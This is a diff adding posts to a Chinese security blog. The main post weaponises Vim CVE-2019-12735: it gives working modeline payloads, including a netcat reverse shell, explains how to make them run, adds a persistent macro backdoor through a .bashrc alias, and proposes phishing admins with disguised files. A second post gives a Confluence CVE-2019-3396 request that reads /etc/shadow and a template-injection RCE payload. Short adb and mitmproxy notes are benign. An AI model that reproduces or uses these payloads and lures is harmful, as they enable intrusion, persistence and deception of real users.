@@ -292,6 +292,630 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/20/基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/06/20/基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735/" itemprop="url">基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-20T15:40:30+08:00">
+                2019-06-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/客户端安全/" itemprop="url" rel="index">
+                    <span itemprop="name">客户端安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h2><p>作为一个vim多年使用者，前两天得知爆出个VIM的RCE漏洞搞的我有点害怕，因此特意对这个漏洞的利用进行了一些研究。由于本人是个菜的抠脚的脚本小子，因此并不会在这篇文章中去给大家解释漏洞原因，作为脚本小子我只关心如何利用。至于漏洞原因的一些解释可以去原作者的git上去看<a href="https://github.com/numirias/security/blob/master/doc/2019-06-04%5C_ace-vim-neovim.md" title="原作者GITHUB" target="_blank" rel="noopener">原作者GITHUB</a></p>
+<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>先讲一下如何漏洞复现，复现该漏洞的基本条件是：</p>
+<ol>
+<li>Vim版本在影响范围内，目前大部分版本都有受影响，至少我最近开启的GCP上的ubuntu默认的vim版本在8.0左右是受影响的。</li>
+<li>必须开启modeline选项，这个选项很关键，我的GCP上默认是不开启的，所以严重降低了该漏洞的危害，不太确定低版本或者是一些衍生版本的vim会不会默认开启。</li>
+</ol>
+<h3 id="复现poc1过程："><a href="#复现poc1过程：" class="headerlink" title="复现poc1过程："></a>复现poc1过程：</h3><ol>
+<li>在～/.vimrc中加入set modeline确保开启该选项<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2. 使用原作者的第一个poc直接写入一个文件并保存：\`:!uname -a||" vi:fen:fdm=expr:fde=assertfails("source\!\ \%"):fdl=0:fdt="</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>`3. 然后使用vim打开该文件，如果受影响就会执行打印uname -a的结果，如果不受影响就是一个普通的文本</p>
+<h3 id="复现poc2过程："><a href="#复现poc2过程：" class="headerlink" title="复现poc2过程："></a>复现poc2过程：</h3><p>先来看看原作者在git上写着的poc2:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x1b\[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc 127.0.0.1 9999 -e /bin/sh &amp;\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert\_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b\[1G\x16\x1b\[KNothing here."\x16\x1b\[D \\n</span><br></pre></td></tr></table></figure></p>
+<p>如果你只是检测的话可以不用看这个poc，这个poc主要是用来贴近实战的利用。我估计会有人使用这个poc1成功，但是使用poc2始终不成功，其实这个poc有几个地方需要改一下（准确来说是不能复制黏贴）：</p>
+<ol>
+<li>这里面涉及到的十六进制比如\x1b是需要通过二进制编辑器直接改成二进制的，复制黏贴是不行的。将poc中所有的十六进制位置编辑成二进制即可。</li>
+<li>反斜杠的问题，原poc中作者为了转义特殊符号来显示所以多加了反斜杠，将所有涉及到转义的字符前面多一个的反斜杠“\”去掉就可以了</li>
+<li>必要的话将最后的\n直接改成回车，如果\n在你的文本里没有被解释成回车的话</li>
+</ol>
+<p>按照上面说的流程修改完poc后，我们在测试机本地起个nc监听：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure></p>
+<p>最后打开poc2即可看到nc获取到了反弹链接。</p>
+<h2 id="0x02-改造poc2加入宏后门"><a href="#0x02-改造poc2加入宏后门" class="headerlink" title="0x02 改造poc2加入宏后门"></a>0x02 改造poc2加入宏后门</h2><p>先来说说为什么要加入宏后门，poc2中有个问题，就是当vim打开一次文档后，就不会在携带有恶意代码了从而变成一个普通文档。虽然我们可以通过第一次建立连接后下载木马来获得持久的后门，但这个方式不在讨论范围内了。这里我的想法是先实现每次打开文档都会获得反弹链接的持久后门，而不是依赖于下载外部木马。<br>Poc2其实加了很多代码用来伪装成正常文件内容，使人即使打开文件也不会察觉到里面藏有恶意代码，而poc1则会很明显看到代码执行。这个伪装有几个特点：</p>
+<ol>
+<li>受影响版本的vim和cat打开都不会显示插入的恶意代码</li>
+<li>cat -v可以看到恶意代码</li>
+<li>不同版本的cat可能会看到一些显示的差异，但是恶意代码依旧是看不到的</li>
+</ol>
+<p>为了不破坏伪装同时做成可持续的后门，比较菜的我只想到了利用vim宏来达到这个效果。</p>
+<h3 id="基本实现思路"><a href="#基本实现思路" class="headerlink" title="基本实现思路"></a>基本实现思路</h3><p>首先，我们希望的是每次vim文件都会执行代码，那么有没有可能使其每次vim文件的时候都执行一边vim宏呢？这是可能的，过程如下：</p>
+<ol>
+<li>在vim窗口录制宏：q{寄存器名称}，录制完成后再按下q按键停止</li>
+<li>在～/.bashrc中写入alias vim=vim -c ‘@{寄存器名称}’ 以及shopt -s expand_aliases，通过alias替换vim别名的方式来打开文件默认执行宏</li>
+<li>那么只要管理员重新登录shell，以后不管他vim什么文件都会执行我们写在宏里的命令</li>
+</ol>
+<p>接下来要做的就是在poc2中合适的地方加入录制宏的命令，其实poc2中那些十六进制比如\x1b是ESC的意思，可以联想到这个应该是vim中切换模式的按键，因此我们可以通过在ESC之后需要执行的命令之前加入qy来开始录制宏y，在命令执行完后某个合适的位置加入q来终止宏的录制。在试了很多次后最终有了以下exp：<br><a href="https://github.com/mikuKeeper/security/blob/master/data/2019-06-04%5C_ace-vim-neovim/%E5%AE%8F%E5%90%8E%E9%97%A8%5C_%E6%AD%A3%E5%B8%B8%E7%89%88vim%5C_CVE-2019-12735.txt" title="exp1" target="_blank" rel="noopener">后门exp1</a></p>
+<h3 id="进一步优化"><a href="#进一步优化" class="headerlink" title="进一步优化"></a>进一步优化</h3><p>上面那个poc依旧存在几个问题：</p>
+<ol>
+<li>每次执行都会疯狂的往bashrc里插入alias那两句，只要vim一次就插一次，这很不好</li>
+<li>没有伪装成正常文件内容</li>
+</ol>
+<p>为了改善第一个问题，我们可以通过分开执行两次命令，然后宏只录制第一个命令（即反弹shell），第二个插入命令只执行一次。这听起来很容易，其实做起来并不容易……多次执行会遇到很多问题，因为我太菜了所以花了很长的时间。<br>改善第二个问题，其实也远远没有想的那么简单，以为只是在空白处插入文本即可，其实不是的，原poc中的命令会对这些文本产生影响，所以写入什么样的文本都还是有点考究的。<br>这边给出一个最终将这两个问题都解决了并且伪装成一个PHP一句话的案例：<br><a href="https://github.com/mikuKeeper/security/blob/master/data/2019-06-04%5C_ace-vim-neovim/%E5%AE%8F%E5%90%8E%E9%97%A8%5C_webshell%E4%BC%98%E5%8C%96%E7%89%88%5C_vim%5C_CVE-2019-12735.txt" title="伪装成webshell版本" target="_blank" rel="noopener">后门exp2</a><br>最后还有个vim历史命令里会残留执行的命令的问题，这个可以通过插入一些垃圾vim命令来伪装。</p>
+<h2 id="0x03-思考总结"><a href="#0x03-思考总结" class="headerlink" title="0x03 思考总结"></a>0x03 思考总结</h2><p>考虑到这个漏洞需要开启modeline选项，所以危害严重降低。不过还是可以通过钓鱼来碰运气的，因为你说不好就有生产环境的vim开了这个。假设他们开了那么这个就会成为一个Linux上类似于win上的点击病毒，只要vim了就会中招，而且会随着原文件的copy同步来扩大。还有一些mbp用户也会中招，比如你在网上散播伪装成nginx.conf的文件，诱导那些可怜的开发者来下载使用。<br>甚至于我们可以伪装成一个一句话木马上传到目标站点，至于他能不能执行都不重要，直接发邮件给管理员伪装成安全公司来告知他们扫描发现木马，建议他们通过vim打开文件确认后删除……<br>总之开开脑洞还是可能有利用场景的，不过我个人认为吧，没错这个漏洞就是鸡肋玩具！<br>最后如果有朋友知道具体哪些版本和可能的场景下vim会默认打开modeline选项，还请告知谢谢啦。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/08/CVE-2019-3396：confluence任意文件读取与RCE漏洞复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/08/CVE-2019-3396：confluence任意文件读取与RCE漏洞复现/" itemprop="url">CVE-2019-3396：confluence任意文件读取与RCE漏洞复现</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-08T19:20:18+08:00">
+                2019-04-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="CVE-2019-3396的相关情报"><a href="#CVE-2019-3396的相关情报" class="headerlink" title="CVE-2019-3396的相关情报"></a>CVE-2019-3396的相关情报</h1><p>详细的漏洞解析参考<a href>cve-2019-3396</a></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>构造请求<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line">Host: confluence.xxxxxx.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: text/html, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Referer: http://confluence.xxxxx.com/pages/editpage.action?pageId=32093515</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: xxxxxxx</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 176</span><br><span class="line"></span><br><span class="line">&#123;"contentId":"655594","macro":&#123;"name":"widget","body":"","params":&#123;"url":"https://dailymotion.com/video/xcpa64","width":"300","height":"200","_template":"file:///etc/shadow”&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>通过template参数中使用file协议可以读取服务器上的任意文件</p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>由于confluence使用的是velocity模版引擎，而这个任意文件读取本身是通过渲染模版文件来读取的，因此如果模板文件里调用java对象是会被渲染执行的，具体参考下面：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($e="e")</span><br><span class="line">$e.getClass().forName('java.lang.System').getMethod('getProperty', $e.getClass().forName('java.lang.String')).invoke(null, 'os.name').toString()</span><br></pre></td></tr></table></figure></p>
+<p>随意上传或者远端存储一个该内容的vm文件，然后通过上述的文件包含漏洞去包含这个模板文件即可导致RCE</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/08/安卓模拟器相关/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/08/安卓模拟器相关/" itemprop="url">安卓模拟器相关</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-08T17:43:21+08:00">
+                2019-04-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/移动安全攻防/" itemprop="url" rel="index">
+                    <span itemprop="name"> 移动安全攻防</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="安卓模拟器杂七杂八的记录"><a href="#安卓模拟器杂七杂八的记录" class="headerlink" title="安卓模拟器杂七杂八的记录"></a>安卓模拟器杂七杂八的记录</h2><h2 id="adb常规操作"><a href="#adb常规操作" class="headerlink" title="adb常规操作"></a>adb常规操作</h2><h4 id="adb基本操作"><a href="#adb基本操作" class="headerlink" title="adb基本操作"></a>adb基本操作</h4><p>可以参考mumu模拟器官方的文档，蛮详细的<a href>adb常规操作</a></p>
+<h4 id="app备份"><a href="#app备份" class="headerlink" title="app备份"></a>app备份</h4><p>adb backup -f “D:\myfolder\myapp.ab” -apk \<package name\><br>adb restore “D:\myfolder\myapp.ab”</package></p>
+<h2 id="mumu模拟器"><a href="#mumu模拟器" class="headerlink" title="mumu模拟器"></a>mumu模拟器</h2><h2 id="夜神模拟器"><a href="#夜神模拟器" class="headerlink" title="夜神模拟器"></a>夜神模拟器</h2>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/MITMPROXY的摘要/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/03/MITMPROXY的摘要/" itemprop="url">MITMPROXY的摘要</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-03T15:40:30+08:00">
+                2019-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/爬虫/" itemprop="url" rel="index">
+                    <span itemprop="name">爬虫</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="MITMPROXY基本介绍"><a href="#MITMPROXY基本介绍" class="headerlink" title="MITMPROXY基本介绍"></a>MITMPROXY基本介绍</h1><p>没什么好介绍的，用过burpsuite的理解这个应该没什么难度，就是个httpproxy。主要特色是有命令行工具可以操作抓包，同时可以通过自定义python脚本来集成一些批量化请求和响应的操作比较方便。主要有mitmproxy、mitmdump、mitmweb</p>
+<h2 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h2><p>Mitmproxy很简单，就是个命令行的bursuite，命令行界面操作起来有点像vim，操作的时候更多是对请求进行重新编辑后重放来实现。其他和burp类似的功能，记录各种请求和响应信息。</p>
+<ul>
+<li>貌似支持一个叫做key binding的功能，应该是类似于自定义快捷键和宏操作差不多的意思，主要是在它的终端中使用的。</li>
+<li>支持通过正则配置替换规则来对内容进行替换</li>
+<li>支持过滤，过滤语法参考<a href="https://docs.mitmproxy.org/stable/concepts-filters/" title="mitmproxy filter" target="_blank" rel="noopener">mitmproxy filter</a></li>
+<li>似乎支持TCP代理，但是不能对TCP流进行修改</li>
+<li>支持websocket</li>
+<li>支持socks proxy</li>
+<li>支持透明模式，透明模式是指在网络层进行端口重定向到proxy上，不过不能绕过证书校验（配合ssltrip进行降级可能可行）具体参考<a href="https://docs.mitmproxy.org/stable/howto-transparent/" title="mitmproxy透明模式" target="_blank" rel="noopener">mitmproxy透明模式</a><h2 id="mitmdump"><a href="#mitmdump" class="headerlink" title="mitmdump"></a>mitmdump</h2>Mitmdump与proxy不同的地方在于它可以把请求响应dump出来，并且可以通过自定义的python脚本来实现规则，通过mitmdump -s xxx.py来实现。<br>关于脚本编写的一些案例可以参考<a href="https://docs.mitmproxy.org/stable/addons-scripting/" title="mitmproxy-scripting" target="_blank" rel="noopener">mitmproxy-scripting</a><h2 id="mitmweb"><a href="#mitmweb" class="headerlink" title="mitmweb"></a>mitmweb</h2>mitmproxy的web版本<br>没有更多想说的</li>
+</ul>
+<h1 id="其他重点记录"><a href="#其他重点记录" class="headerlink" title="其他重点记录"></a>其他重点记录</h1><p>暂无</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/bilibili子域名根目录挂黑页问题记录/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -934,7 +1558,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -945,7 +1569,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -956,7 +1580,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
@@ -1014,7 +1638,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
